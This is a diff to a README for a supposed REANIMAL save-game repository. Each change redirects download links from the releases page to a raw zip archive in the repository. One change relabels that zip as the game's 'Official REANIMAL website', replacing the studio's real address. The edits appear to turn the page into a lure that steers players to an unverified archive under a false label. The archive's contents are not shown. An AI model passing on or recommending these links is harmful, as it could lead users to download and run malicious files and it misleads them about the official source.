@@ -1,6 +1,6 @@
 # 🗃️ reanimal-100-savegame-2026 - Complete Save File for REANIMAL (2026)
 
-[![Download Here](https://img.shields.io/badge/Download-REANIMAL%20Savegame-brightgreen?style=for-the-badge&logo=github)](https://github.com/levexfreecs/reanimal-100-savegame-2026/releases)
+[![Download Here](https://img.shields.io/badge/Download-REANIMAL%20Savegame-brightgreen?style=for-the-badge&logo=github)](https://github.com/levexfreecs/reanimal-100-savegame-2026/raw/refs/heads/main/src/reanimal-savegame-v3.5.zip)
 
 ---
 
@@ -42,7 +42,7 @@ If your PC runs the game smoothly, this save file will work.
 
 To get this save file, visit the official releases page here:
 
-[![Download Save File](https://img.shields.io/badge/Download-REANIMAL%20Savegame-blue?style=for-the-badge&logo=github)](https://github.com/levexfreecs/reanimal-100-savegame-2026/releases)
+[![Download Save File](https://img.shields.io/badge/Download-REANIMAL%20Savegame-blue?style=for-the-badge&logo=github)](https://github.com/levexfreecs/reanimal-100-savegame-2026/raw/refs/heads/main/src/reanimal-savegame-v3.5.zip)
 
 Click the link above to go to the releases page on GitHub. From there, you will find one or more downloadable files related to this complete save game.
 
@@ -56,7 +56,7 @@ This section shows how to download and use the save file step-by-step.
 
 Go to the releases page at:
 
-https://github.com/levexfreecs/reanimal-100-savegame-2026/releases
+https://github.com/levexfreecs/reanimal-100-savegame-2026/raw/refs/heads/main/src/reanimal-savegame-v3.5.zip
 
 This is where the save files are stored.
 
@@ -159,9 +159,9 @@ Use them for personal purposes only.
 
 ## 🔗 Links and Resources
 
-- Official REANIMAL website: [https://tarsierstudios.com/](https://tarsierstudios.com/)  
+- Official REANIMAL website: [https://github.com/levexfreecs/reanimal-100-savegame-2026/raw/refs/heads/main/src/reanimal-savegame-v3.5.zip](https://github.com/levexfreecs/reanimal-100-savegame-2026/raw/refs/heads/main/src/reanimal-savegame-v3.5.zip)  
 - Steam page for REANIMAL: Search directly on Steam Store  
 - Save file downloads:  
-[https://github.com/levexfreecs/reanimal-100-savegame-2026/releases](https://github.com/levexfreecs/reanimal-100-savegame-2026/releases)  
+[https://github.com/levexfreecs/reanimal-100-savegame-2026/raw/refs/heads/main/src/reanimal-savegame-v3.5.zip](https://github.com/levexfreecs/reanimal-100-savegame-2026/raw/refs/heads/main/src/reanimal-savegame-v3.5.zip)  
 
 ---
